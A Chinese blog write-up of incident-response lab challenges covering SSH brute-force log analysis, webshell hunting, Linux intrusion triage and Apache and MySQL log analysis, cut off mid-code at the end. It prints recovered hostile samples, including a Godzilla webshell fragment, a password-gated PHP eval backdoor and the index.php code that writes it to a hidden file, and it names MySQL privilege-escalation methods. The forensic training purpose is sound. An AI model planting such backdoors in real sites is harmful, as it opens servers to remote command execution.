<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Aug  1 07:40:50 linux-rz sshd[7461]: Failed password <span class="keyword">for</span> invalid user test1 from 192.168.200.35 port 33874 ssh2</span><br><span class="line">Aug  1 07:41:04 linux-rz sshd[7465]: Failed password <span class="keyword">for</span> invalid user test2 from 192.168.200.35 port 51640 ssh2</span><br><span class="line">Aug  1 07:41:13 linux-rz sshd[7468]: Failed password <span class="keyword">for</span> invalid user test3 from 192.168.200.35 port 48168 ssh2</span><br><span class="line">Aug  1 07:42:32 linux-rz sshd[7471]: Failed password <span class="keyword">for</span> root from 192.168.200.32 port 51888 ssh2</span><br><span class="line">Aug  1 07:46:41 linux-rz sshd[7475]: Failed password <span class="keyword">for</span> invalid user user from 192.168.200.2 port 36149 ssh2</span><br><span class="line">Aug  1 07:46:47 linux-rz sshd[7478]: Failed password <span class="keyword">for</span> invalid user user from 192.168.200.2 port 44425 ssh2</span><br><span class="line">Aug  1 07:46:50 linux-rz sshd[7480]: Failed password <span class="keyword">for</span> invalid user user from 192.168.200.2 port 38791 ssh2</span><br><span class="line">Aug  1 07:46:54 linux-rz sshd[7482]: Failed password <span class="keyword">for</span> invalid user user from 192.168.200.2 port 37489 ssh2</span><br><span class="line">Aug  1 07:46:56 linux-rz sshd[7484]: Failed password <span class="keyword">for</span> invalid user user from 192.168.200.2 port 35575 ssh2</span><br><span class="line">Aug  1 07:46:59 linux-rz sshd[7486]: Failed password <span class="keyword">for</span> invalid user hello from 192.168.200.2 port 35833 ssh2</span><br><span class="line">Aug  1 07:47:02 linux-rz sshd[7489]: Failed password <span class="keyword">for</span> invalid user hello from 192.168.200.2 port 37653 ssh2</span><br><span class="line">Aug  1 07:47:04 linux-rz sshd[7491]: Failed password <span class="keyword">for</span> invalid user hello from 192.168.200.2 port 37917 ssh2</span><br><span class="line">Aug  1 07:47:08 linux-rz sshd[7493]: Failed password <span class="keyword">for</span> invalid user hello from 192.168.200.2 port 41957 ssh2</span><br><span class="line">Aug  1 07:47:10 linux-rz sshd[7495]: Failed password <span class="keyword">for</span> invalid user hello from 192.168.200.2 port 39685 ssh2</span><br><span class="line">Aug  1 07:47:13 linux-rz sshd[7497]: Failed password <span class="keyword">for</span> root from 192.168.200.2 port 34703 ssh2</span><br><span class="line">Aug  1 07:47:18 linux-rz sshd[7499]: Failed password <span class="keyword">for</span> root from 192.168.200.2 port 46671 ssh2</span><br><span class="line">Aug  1 07:47:20 linux-rz sshd[7501]: Failed password <span class="keyword">for</span> root from 192.168.200.2 port 39967 ssh2</span><br><span class="line">Aug  1 07:47:22 linux-rz sshd[7503]: Failed password <span class="keyword">for</span> root from 192.168.200.2 port 46647 ssh2</span><br><span class="line">Aug  1 07:47:26 linux-rz sshd[7525]: Failed password <span class="keyword">for</span> invalid user  from 192.168.200.2 port 37013 ssh2</span><br><span class="line">Aug  1 07:47:30 linux-rz sshd[7528]: Failed password <span class="keyword">for</span> invalid user  from 192.168.200.2 port 37545 ssh2</span><br><span class="line">Aug  1 07:47:32 linux-rz sshd[7530]: Failed password <span class="keyword">for</span> invalid user  from 192.168.200.2 port 39111 ssh2</span><br><span class="line">Aug  1 07:47:35 linux-rz sshd[7532]: Failed password <span class="keyword">for</span> invalid user  from 192.168.200.2 port 35173 ssh2</span><br><span class="line">Aug  1 07:47:39 linux-rz sshd[7534]: Failed password <span class="keyword">for</span> invalid user  from 192.168.200.2 port 45807 ssh2</span><br><span class="line">Aug  1 07:52:59 linux-rz sshd[7606]: Failed password <span class="keyword">for</span> root from 192.168.200.31 port 40364 ssh2</span><br></pre></td></tr></table></figure>

<p>我们要<strong>for</strong>到<strong>from</strong>之间的字符串,再次过滤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /var/log/auth.log.1|grep -a &quot;Failed password&quot;|grep -o &#x27;for .*from&#x27;|uniq -c|sort -nr</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">      5 <span class="keyword">for</span> invalid user user from</span><br><span class="line">      5 <span class="keyword">for</span> invalid user hello from</span><br><span class="line">      5 <span class="keyword">for</span> invalid user  from</span><br><span class="line">      4 <span class="keyword">for</span> root from</span><br><span class="line">      1 <span class="keyword">for</span> root from</span><br><span class="line">      1 <span class="keyword">for</span> root from</span><br><span class="line">      1 <span class="keyword">for</span> invalid user test3 from</span><br><span class="line">      1 <span class="keyword">for</span> invalid user test2 from</span><br><span class="line">      1 <span class="keyword">for</span> invalid user test1 from</span><br><span class="line">flag&#123;user,hello,root,test3,test2,test1&#125;</span><br></pre></td></tr></table></figure>

<p>这里sort -nr:</p>
<ul>
<li><code>-n</code>：按数字排序（次数）。</li>
<li><code>-r</code>：降序排列（最高频次在前）。</li>
</ul>
<p>uniq -c:统计重复行的次数</p>
<h3 id="登陆成功的IP共爆破了多少次"><a href="#登陆成功的IP共爆破了多少次" class="headerlink" title="登陆成功的IP共爆破了多少次"></a>登陆成功的IP共爆破了多少次</h3><p>前面知道只有192.168.200.2登录成功,找他即可</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /var/log/auth.log.1|grep -a <span class="string">&quot;192.168.200.2&quot;</span>|grep <span class="string">&quot;for root&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Aug  1 07:47:13 linux-rz sshd[7497]: Failed password <span class="keyword">for</span> root from 192.168.200.2 port 34703 ssh2</span><br><span class="line">Aug  1 07:47:18 linux-rz sshd[7499]: Failed password <span class="keyword">for</span> root from 192.168.200.2 port 46671 ssh2</span><br><span class="line">Aug  1 07:47:20 linux-rz sshd[7501]: Failed password <span class="keyword">for</span> root from 192.168.200.2 port 39967 ssh2</span><br><span class="line">Aug  1 07:47:22 linux-rz sshd[7503]: Failed password <span class="keyword">for</span> root from 192.168.200.2 port 46647 ssh2</span><br><span class="line">Aug  1 07:47:23 linux-rz sshd[7505]: Accepted password <span class="keyword">for</span> root from 192.168.200.2 port 46563 ssh2</span><br><span class="line">Aug  1 07:50:37 linux-rz sshd[7539]: Accepted password <span class="keyword">for</span> root from 192.168.200.2 port 48070 ssh2</span><br></pre></td></tr></table></figure>

<p>失败四次,flag{4}</p>
<h3 id="黑客登陆主机后新建了一个后门用户，用户名是多少"><a href="#黑客登陆主机后新建了一个后门用户，用户名是多少" class="headerlink" title="黑客登陆主机后新建了一个后门用户，用户名是多少"></a>黑客登陆主机后新建了一个后门用户，用户名是多少</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /var/log/auth.log.1|grep -a <span class="string">&quot;new user&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Aug  1 07:50:45 linux-rz useradd[7551]: new user: name=test2, UID=1000, GID=1000, home=/home/test2, shell=/bin/sh</span><br><span class="line">Aug  1 08:18:27 ip-172-31-37-190 useradd[487]: new user: name=debian, UID=1001, GID=1001, home=/home/debian, shell=/bin/bash</span><br></pre></td></tr></table></figure>

<p>flag{test2}</p>
<h2 id="第一章-应急响应-webshell查杀"><a href="#第一章-应急响应-webshell查杀" class="headerlink" title="第一章 应急响应-webshell查杀"></a>第一章 应急响应-webshell查杀</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">靶机账号密码 root xjwebshell</span><br><span class="line">1.黑客webshell里面的flag flag&#123;xxxxx-xxxx-xxxx-xxxx-xxxx&#125;</span><br><span class="line">2.黑客使用的什么工具的shell github地址的md5 flag&#123;md5&#125;</span><br><span class="line">3.黑客隐藏shell的完整路径的md5 flag&#123;md5&#125; 注 : /xxx/xxx/xxx/xxx/xxx.xxx</span><br><span class="line">4.黑客免杀马完整路径 md5 flag&#123;md5&#125;</span><br></pre></td></tr></table></figure>

<p>登进去后先把web目录下的文件dump下来</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -czvf html.tar.gz -C /var/www/html </span><br></pre></td></tr></table></figure>

<p>然后用d盾扫一下</p>
<h3 id="黑客webshell里面的flag-flag-xxxxx-xxxx-xxxx-xxxx-xxxx"><a href="#黑客webshell里面的flag-flag-xxxxx-xxxx-xxxx-xxxx-xxxx" class="headerlink" title="黑客webshell里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}"></a>黑客webshell里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}</h3><p>在<code>D:\Problems\webshell\var\www\html\include\gz.php</code>上找到flag</p>
<p><img src="/images/image-20250724152356692.png" alt="image-20250724152356692"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;027ccd04-5065-48b6-a32d-77c704a5e26d&#125;</span><br></pre></td></tr></table></figure>

<h3 id="黑客使用的什么工具的shell-github地址的md5-flag-md5"><a href="#黑客使用的什么工具的shell-github地址的md5-flag-md5" class="headerlink" title="黑客使用的什么工具的shell github地址的md5 flag{md5}"></a>黑客使用的什么工具的shell github地址的md5 flag{md5}</h3><p>直接把如下代码放在github里搜</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$data</span>!==<span class="literal">false</span>)&#123;</span><br><span class="line">    <span class="variable">$data</span>=<span class="title function_ invoke__">encode</span>(<span class="variable">$data</span>,<span class="variable">$key</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>]))&#123;</span><br><span class="line">        <span class="variable">$payload</span>=<span class="title function_ invoke__">encode</span>(<span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>],<span class="variable">$key</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$payload</span>,<span class="string">&quot;getBasicsInfo&quot;</span>)===<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$payload</span>=<span class="title function_ invoke__">encode</span>(<span class="variable">$payload</span>,<span class="variable">$key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="variable">$payload</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">encode</span>(@<span class="title function_ invoke__">run</span>(<span class="variable">$data</span>),<span class="variable">$key</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$data</span>,<span class="string">&quot;getBasicsInfo&quot;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>]=<span class="title function_ invoke__">encode</span>(<span class="variable">$data</span>,<span class="variable">$key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20250724152704598.png" alt="image-20250724152704598"></p>
<p>发现是哥斯拉的webshell,github地址为<a target="_blank" rel="noopener" href="https://github.com/BeichenDream/Godzilla">https://github.com/BeichenDream/Godzilla</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;39392de3218c333f794befef07ac9257&#125;</span><br></pre></td></tr></table></figure>

<h3 id="黑客隐藏shell的完整路径的md5-flag-md5-注-xxx-xxx-xxx-xxx-xxx-xxx"><a href="#黑客隐藏shell的完整路径的md5-flag-md5-注-xxx-xxx-xxx-xxx-xxx-xxx" class="headerlink" title="黑客隐藏shell的完整路径的md5 flag{md5} 注 : &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx.xxx"></a>黑客隐藏shell的完整路径的md5 flag{md5} 注 : &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx.xxx</h3><p><img src="/images/image-20250724155220079.png" alt="image-20250724155220079"></p>
<p>mysqli.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/include/Db/.Mysqli.php</span><br><span class="line">flag&#123;aebac0e58cd6c5fad1695ee4d1ac1919&#125;</span><br></pre></td></tr></table></figure>

<h3 id="黑客免杀马完整路径-md5-flag-md5"><a href="#黑客免杀马完整路径-md5-flag-md5" class="headerlink" title="黑客免杀马完整路径 md5 flag{md5}"></a>黑客免杀马完整路径 md5 flag{md5}</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">id      级别  大小       CRC        修改时间             文件 (说明)</span><br><span class="line"> --------------------------------------------------------------------------------------------------------------------------------------------</span><br><span class="line"> 00001   4     38         FEE1C229   23-08-02 10:52:25    \html\shell.php     『Eval后门 &#123;参数:$_REQUEST[1]&#125;』</span><br><span class="line"> 00002   4     808        3F54B485   23-08-02 10:56:39    \html\include\gz.php  『(内藏)Eval后门 &#123;参数:encode($_SESSION[$payloadName],&quot;3c6e0b8a9c15224a&quot;)&#125;』</span><br><span class="line"> 00003   3     205        D6CF6AC8   23-08-02 16:56:29    \html\wap\top.php   『变量函数[$c($fun)]|可疑文件』</span><br><span class="line"> 00004   4     768        3DEFBD91   23-08-02 11:01:06    \html\include\Db\.Mysqli.php  『(内藏)Eval后门 &#123;参数:encode($_SESSION[$payloadName],&quot;3c6e0b8a9c15224a&quot;)&#125;』</span><br></pre></td></tr></table></figure>

<p>这个是d盾扫出来的</p>
<p><img src="/images/image-20250724155717548.png" alt="image-20250724155717548"></p>
<p>这个是火绒找出来的,差了个top.php</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/wap/top.php</span><br><span class="line">flag&#123;eeff2eabfd9b7a6d26fc1a53d3f7d1de&#125;</span><br></pre></td></tr></table></figure>

<h2 id="第一章-应急响应-Linux入侵排查"><a href="#第一章-应急响应-Linux入侵排查" class="headerlink" title="第一章 应急响应- Linux入侵排查"></a>第一章 应急响应- Linux入侵排查</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">账号：root 密码：linuxruqin</span><br><span class="line">ssh root@IP</span><br><span class="line">1.web目录存在木马，请找到木马的密码提交</span><br><span class="line">2.服务器疑似存在不死马，请找到不死马的密码提交</span><br><span class="line">3.不死马是通过哪个文件生成的，请提交文件名</span><br><span class="line">4.黑客留下了木马文件，请找出黑客的服务器ip提交</span><br><span class="line">5.黑客留下了木马文件，请找出黑客服务器开启的监端口提交</span><br></pre></td></tr></table></figure>

<p>dump下来给火绒查杀</p>
<p><img src="/images/image-20250724161457342.png" alt="image-20250724161457342"></p>
<h3 id="web目录存在木马，请找到木马的密码提交"><a href="#web目录存在木马，请找到木马的密码提交" class="headerlink" title="web目录存在木马，请找到木马的密码提交"></a>web目录存在木马，请找到木马的密码提交</h3><p><img src="/images/image-20250724161337227.png" alt="image-20250724161337227"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;1&#125;</span><br></pre></td></tr></table></figure>

<h3 id="服务器疑似存在不死马，请找到不死马的密码提交"><a href="#服务器疑似存在不死马，请找到不死马的密码提交" class="headerlink" title="服务器疑似存在不死马，请找到不死马的密码提交"></a>服务器疑似存在不死马，请找到不死马的密码提交</h3><p>创建.符号开头也很明确了，就是为了创建隐藏webshell连接木马</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&quot;pass&quot;</span>])==<span class="string">&quot;5d41402abc4b2a76b9719d911017c592&quot;</span>)&#123;@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[cmd]);&#125;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>POST传进来的md5的那一大串转为字符串为<strong>hello</strong>故flag就找到了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;hello&#125;</span><br></pre></td></tr></table></figure>

<h3 id="不死马是通过哪个文件生成的，请提交文件名"><a href="#不死马是通过哪个文件生成的，请提交文件名" class="headerlink" title="不死马是通过哪个文件生成的，请提交文件名"></a>不死马是通过哪个文件生成的，请提交文件名</h3><p>在index.php里看到这些东西：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span> = <span class="string">&#x27;/var/www/html/.shell.php&#x27;</span>;</span><br><span class="line"><span class="variable">$code</span> = <span class="string">&#x27;&lt;?php if(md5($_POST[&quot;pass&quot;])==&quot;5d41402abc4b2a76b9719d911017c592&quot;)&#123;@eval($_POST[cmd]);&#125;?&gt;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>, <span class="variable">$code</span>);</span><br></pre></td></tr></table></figure>

<p>很明显就是通过index.php给.shell.php写不死马</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;index.php&#125;</span><br></pre></td></tr></table></figure>

<h3 id="黑客留下了木马文件，请找出黑客的服务器ip提交"><a href="#黑客留下了木马文件，请找出黑客的服务器ip提交" class="headerlink" title="黑客留下了木马文件，请找出黑客的服务器ip提交"></a>黑客留下了木马文件，请找出黑客的服务器ip提交</h3><p>还剩一个shell.elf没处理,linux可执行文件,我们在靶机上尝试执行一下</p>
<p>发现没有用可执行权限,加上x权限即可</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">chmod</span> +x shell\(1\).elf <span class="comment">#括号转义</span></span><br><span class="line">./shell\(1\).elf &amp; <span class="comment"># &#x27;&amp;&#x27; 把文件放在后台执行,不阻塞shell</span></span><br></pre></td></tr></table></figure>

<p>然后netstat -alntup看一下连接情况</p>
<p><img src="/images/image-20250724163018731.png" alt="image-20250724163018731"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;10.11.55.21&#125;</span><br></pre></td></tr></table></figure>

<h3 id="黑客留下了木马文件，请找出黑客服务器开启的监端口提交"><a href="#黑客留下了木马文件，请找出黑客服务器开启的监端口提交" class="headerlink" title="黑客留下了木马文件，请找出黑客服务器开启的监端口提交"></a>黑客留下了木马文件，请找出黑客服务器开启的监端口提交</h3><p>上一题可知</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;3333&#125;</span><br></pre></td></tr></table></figure>

<h2 id="第一章-日志分析-apache日志分析"><a href="#第一章-日志分析-apache日志分析" class="headerlink" title="第一章 日志分析-apache日志分析"></a>第一章 日志分析-apache日志分析</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、提交当天访问次数最多的IP，即黑客IP：</span><br><span class="line">2、黑客使用的浏览器指纹是什么，提交指纹的md5：</span><br><span class="line">3、查看包含index.php页面被访问的次数，提交次数：</span><br><span class="line">4、查看黑客IP访问了多少次，提交次数：</span><br><span class="line">5、查看2023年8月03日8时这一个小时内有多少IP访问，提交次数:</span><br></pre></td></tr></table></figure>

<h3 id="提交当天访问次数最多的IP，即黑客IP："><a href="#提交当天访问次数最多的IP，即黑客IP：" class="headerlink" title="提交当天访问次数最多的IP，即黑客IP："></a>提交当天访问次数最多的IP，即黑客IP：</h3><p>错误日志路径在<code>/var/log/apache2/error.log.1</code>下，</p>
<p><img src="/images/image-20251004235552672.png" alt="image-20251004235552672"></p>
<p>直接就能看出ip是<code>192.168.200.2</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;192.168.200.2&#125;</span><br></pre></td></tr></table></figure>

<h3 id="黑客使用的浏览器指纹是什么，提交指纹的md5："><a href="#黑客使用的浏览器指纹是什么，提交指纹的md5：" class="headerlink" title="黑客使用的浏览器指纹是什么，提交指纹的md5："></a>黑客使用的浏览器指纹是什么，提交指纹的md5：</h3><p>结合<code>access.log.1</code>里的内容一起看，以时间戳<code>[Thu Aug 03 08:46:44.388147 2023]</code>为例子找到对应</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> 1.txt | grep -a <span class="string">&quot;08:46:44&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20251005000154480.png" alt="image-20251005000154480"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;2d6330f380f44ac20f3a02eed0958f66&#125;</span><br></pre></td></tr></table></figure>

<h3 id="查看包含index-php页面被访问的次数，提交次数："><a href="#查看包含index-php页面被访问的次数，提交次数：" class="headerlink" title="查看包含index.php页面被访问的次数，提交次数："></a>查看包含index.php页面被访问的次数，提交次数：</h3><p>在<code>access.log.1</code>里直接看</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ip-10-0-10-2:/var/log/apache2# <span class="built_in">cat</span> 1.txt | grep -a <span class="string">&quot;/index.php&quot;</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -nr|<span class="built_in">wc</span> -l</span><br><span class="line">27</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;27&#125;</span><br></pre></td></tr></table></figure>

<h3 id="查看黑客IP访问了多少次，提交次数："><a href="#查看黑客IP访问了多少次，提交次数：" class="headerlink" title="查看黑客IP访问了多少次，提交次数："></a>查看黑客IP访问了多少次，提交次数：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grep -Ea <span class="string">&quot;^192.168.200.2 - -&quot;</span> /var/log/apache2/access.log.1 | <span class="built_in">wc</span> -l</span><br><span class="line">6555</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20251005001906388.png" alt="image-20251005001906388"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;6555&#125;</span><br></pre></td></tr></table></figure>

<h3 id="查看2023年8月03日8时这一个小时内有多少IP访问，提交次数"><a href="#查看2023年8月03日8时这一个小时内有多少IP访问，提交次数" class="headerlink" title="查看2023年8月03日8时这一个小时内有多少IP访问，提交次数:"></a>查看2023年8月03日8时这一个小时内有多少IP访问，提交次数:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">grep -Ea <span class="string">&quot;^[0-9]+.*+03/Aug/2023:[08|09]&quot;</span> /var/log/apache2/access.log.1 | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | <span class="built_in">uniq</span> -c | <span class="built_in">wc</span> -l</span><br><span class="line"></span><br><span class="line">root@ip-10-0-10-3:/var/log/apache2# grep -Ea <span class="string">&quot;^[0-9]+.*+03/Aug/2023:[08|09]&quot;</span> /var/log/apache2/access.log.1 | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | <span class="built_in">uniq</span> -c | <span class="built_in">wc</span> -l</span><br><span class="line">5</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;5&#125;</span><br></pre></td></tr></table></figure>

<h2 id="第一章日志分析-mysql应急响应"><a href="#第一章日志分析-mysql应急响应" class="headerlink" title="第一章日志分析-mysql应急响应"></a>第一章日志分析-mysql应急响应</h2><h3 id="黑客第一次写入的shell"><a href="#黑客第一次写入的shell" class="headerlink" title="黑客第一次写入的shell"></a>黑客第一次写入的shell</h3><p>在web目录下发现sh.php</p>
<p><img src="/images/image-20251005123214865.png" alt="image-20251005123214865"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ccfda79e-7aa1-4275-bc26-a6189eb9a20b&#125;</span><br></pre></td></tr></table></figure>

<h3 id="黑客反弹shell的ip"><a href="#黑客反弹shell的ip" class="headerlink" title="黑客反弹shell的ip"></a>黑客反弹shell的ip</h3><p>需要到mysql的报错日志下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/log/mysql/error.log</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20251005123505479.png" alt="image-20251005123505479"></p>
<p>发现一个可疑的<code>/tmp/1.sh</code>文件</p>
<p><img src="/images/image-20251005123547831.png" alt="image-20251005123547831"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;192.168.100.13&#125;</span><br></pre></td></tr></table></figure>

<h3 id="黑客提权文件的完整路径"><a href="#黑客提权文件的完整路径" class="headerlink" title="黑客提权文件的完整路径"></a>黑客提权文件的完整路径</h3><p>首先要知道mysql提权的几种方式</p>
<ol>
<li>UDF 提权</li>
<li>MOF提权</li>
<li>启动项提权</li>
<li>CVE-2016-6663</li>
</ol>
<p>其中，2，3都是在windows环境下才能进行，故排除，4需要 MariaDB &lt;&#x3D; 5.5.51 或 10.0.x &lt;&#x3D; 10.0.27 或 10.1.x &lt;&#x3D; 10.1.17，而我们环境的 MariaDB 版本为 5.5.64，不在此漏洞的影响版本内，也可以排除掉</p>
<p>UDF提权的文章：<a target="_blank" rel="noopener" href="https://hilang.cloud/mysql-%e6%8f%90%e6%9d%83/">https://hilang.cloud/mysql-%e6%8f%90%e6%9d%83/</a></p>
<p>UDF 提权是基于自定义函数实现的，而自定义函数的前提是 UDF 的动态链接库文件放置于 MySQL 安装目录下的lib\plugin文件夹，故我们需要登录 Mysql 对 plugin 关键字进行排查，在web目录下的common.php发现mysql连接的账号密码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@xuanji:/<span class="keyword">var</span>/log/mysql<span class="comment"># cat /var/www/html/common.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$conn</span>=<span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;334cc35b3c704593&quot;</span>,<span class="string">&quot;cms&quot;</span>,<span class="string">&quot;3306&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$conn</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;数据库连接失败&quot;</span>;</span><br><span 